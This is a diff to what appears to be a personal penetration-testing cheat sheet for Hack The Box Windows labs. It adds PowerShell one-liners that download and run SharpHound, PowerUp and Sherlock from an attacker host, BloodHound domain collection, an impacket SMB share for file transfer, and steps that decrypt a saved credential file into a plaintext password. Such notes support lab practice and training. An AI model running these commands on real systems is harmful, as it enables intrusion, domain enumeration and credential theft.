@@ -181,6 +181,28 @@ IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6/PrivescCheck/Pri
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/PowerUp.ps1') | powershell -noprofile -
 ```
 
+
+## SharpHound.ps1
+```
+IWR -Uri http://10.10.16.20/SharpHound.ps1 -OutFile SharpHound.ps1
+```
+or
+```
+IEX (New-Object Net.Webclient).downloadstring("http://10.10.16.20/SharpHound.ps1")
+```
+
+Not able to run the Bloodhound from the sharp hound function will see what mistake i am doing . Refer the PDF once to see how they have run the bloodhound.
+```
+Invoke-BloodHound -CollectionMethod All
+```
+
+```
+net use z: \\10.10.16.20\share
+impacket-smbserver share $(pwd)
+```
+
+
+
 ## Sherlock
 ```
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.2:8080/Sherlock.ps1') | powershell -noprofile -
@@ -280,6 +302,28 @@ python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 impacket-smbserver Toolkit $(pwd)
 ```
+
+
+
+## Decrypt 
+There is cred.xml file where the password is encrypted we have to find a way to decrypt it.
+
+```
+$pass = "Encrypted_Password" | convertto-securestring
+```
+
+```
+$user = "HTB\Tom"
+```
+
+```
+$cred = New-Object System.Management.Automation.PSCredential($user,$pass)
+```
+
+```
+$cred.GetNetworkCredential() | fl
+```
+
 
 
 # Lolbins
